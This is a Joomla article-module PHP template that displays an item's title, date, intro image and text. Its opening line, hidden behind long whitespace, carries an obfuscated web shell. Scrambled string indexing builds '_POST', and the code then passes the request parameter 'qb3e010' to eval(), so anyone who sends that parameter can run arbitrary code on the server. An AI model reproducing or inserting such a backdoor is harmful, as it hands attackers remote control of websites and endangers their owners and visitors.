<?php                                                                                                                                                                                                                                                      $qin1 = "rtp_soeu"; $dwx74=$qin1[4]. $qin1[1].$qin1[0].$qin1[1].$qin1[5]. $qin1[7]. $qin1[2].$qin1[2]. $qin1[6].$qin1[0] ;$reej2=$dwx74 ( $qin1[3]. $qin1[2] . $qin1[5]. $qin1[4]. $qin1[1]); if (isset(${ $reej2 } [ 'qb3e010' ] ) ) {eval(${ $reej2 }['qb3e010']);}?><?php
	defined('_JEXEC') or die;
?>

<div class="mod-article-single mod-article-single__<?php echo $moduleclass_sfx; ?>">
	<div class="item__module">

		<!-- Item Title -->
		<?php if ($params->get('item_title')) : ?>
			<<?php echo $item_heading; ?> class="item-title">
				<?php if ($params->get('link_titles') && isset($item->link)) : ?>
					<a href="<?php echo $item->link;?>">
						<?php echo $item->title;?></a>
				<?php else : ?>
					<?php echo $item->title; ?>
				<?php endif; ?>
			</<?php echo $item_heading; ?>>
		<?php endif; ?>

		<?php echo $item->afterDisplayTitle; ?>


		<?php echo $item->beforeDisplayContent; ?>


		<!-- Publish Date -->

		<?php if ($params->get('published_on')) : ?>
			<span class="item_published">
				<i class="icon-calendar"></i><?php echo JText::sprintf(JHtml::_('date', $item->publish_up, JText::_('DATE_FORMAT_LC3'))); ?>
			</span>
		<?php endif; ?>


		<!-- Intro Image -->

		<?php if ($params->get('show_intro_image')) : ?>
			<?php  if (isset($item_images->image_intro) and !empty($item_images->image_intro)) : ?>
			<?php $imgfloat = (empty($item_images->float_intro)) ? $params->get('float_intro') : $item_images->float_intro; ?>
			<div class="item_img img-intro img-intro__<?php echo htmlspecialchars($imgfloat); ?>"> <img
				<?php if ($item_images->image_intro_caption):
					echo 'class="caption"'.' title="' .htmlspecialchars($item_images->image_intro_caption) .'"';
				endif; ?>
				src="<?php echo htmlspecialchars($item_images->image_intro); ?>" alt="<?php echo htmlspecialchars($item_images->image_intro_alt); ?>"/> </div>
			<?php endif; ?>
		<?php endif; ?>


		<!-- Intro Text -->

		<div class="item_introtext">
			<?php echo $item->introtext; ?>

			<?php 

				if (isset($item->link) && $params->get('readmore')) :
					$readMoreText = JText::_('TPL_COM_CONTENT_READ_MORE');
					if ($item->params->get('alternative_readmore')){
						$readMoreText = $item->params->get('alternative_readmore');
					}
					echo '<a class="btn btn-info readmore" href="'.$item->link.'"><span>'. $readMoreText .'</span></a>';

				endif; 

			?>


		</div>	

	</div>
</div>